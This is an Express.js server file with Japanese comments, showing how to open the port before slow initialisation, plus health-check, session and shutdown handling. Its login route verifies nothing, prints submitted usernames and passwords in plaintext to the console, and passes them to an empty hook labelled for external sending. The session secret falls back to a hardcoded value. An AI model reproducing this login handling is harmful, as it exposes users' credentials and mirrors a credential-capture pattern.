// server.js
'use strict';

const path = require('path');
const express = require('express');
const session = require('express-session');

const PORT = process.env.PORT || 3000;
const app = express();

/* ============================================================
   1. ヘルスチェック ── 最優先・最軽量
      session より前に置く（認証でリダイレクトされないように）
   ============================================================ */
app.get('/healthz', (req, res) => {
  res.status(200).type('text/plain').send('ok');
});

/* ============================================================
   2. 軽量ミドルウェア（登録は同期なので起動を止めない）
   ============================================================ */
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1h' }));

app.use(session({
  secret: process.env.SESSION_SECRET || 'change-me',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 1000 * 60 * 60 * 24 },
}));

/* ============================================================
   3. ルーティング
   ============================================================ */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  console.log('[LOGIN]', username, password);

  // ここで await してもOK（listen済みなので影響なし）
  try {
    if (onLogin) await onLogin(username, password);
  } catch (e) {
    console.error('onLogin failed:', e);
  }

  res.redirect('/?ok=1');
});

/* ============================================================
   4. ★ ここが本題 ── 重い初期化より先にポートを開ける
   ============================================================ */
const server = app.listen(PORT, () => {
  console.log('listening on ' + PORT);
});

/* ============================================================
   5. 重い初期化は listen の「後」（並列で走る）
   ============================================================ */
let onLogin = null;

async function init() {
  // await connectDB();          // ← DB接続などがあればここ
  onLogin = async (u, p) => {
    // 外部送信・通知などの処理
  };
  console.log('init done');
}

init().catch((e) => console.error('init failed:', e));

/* ============================================================
   6. 落ちにくくする（任意だが推奨）
   ============================================================ */
process.on('unhandledRejection', (e) => console.error('unhandledRejection', e));
process.on('uncaughtException', (e) => console.error('uncaughtException', e));

['SIGTERM', 'SIGINT'].forEach((sig) => {
  process.on(sig, () => server.close(() => process.exit(0)));
});
